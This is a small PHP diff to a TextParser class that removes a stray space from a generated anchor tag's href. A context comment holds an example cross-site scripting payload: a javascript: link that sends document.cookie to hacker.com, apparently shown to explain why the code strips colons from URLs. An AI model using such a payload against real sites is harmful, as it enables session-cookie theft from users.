@@ -25,7 +25,7 @@ class TextParser
                 //<a href="javascript:window.open('http://hacker.com?cookie='+document.cookie)">
                 $url = preg_replace('/:/', '', $url);
             }
-            $link[$index] = '<a href=" ' .$url . '" ' . $rest . '>' . $matches[4] . '</a>';
+            $link[$index] = '<a href="' . $url . '" ' . $rest . '>' . $matches[4] . '</a>';
             $text = $matches[1] . '%%' . $index . '%%' . $matches[5];
             ++$index;
         }
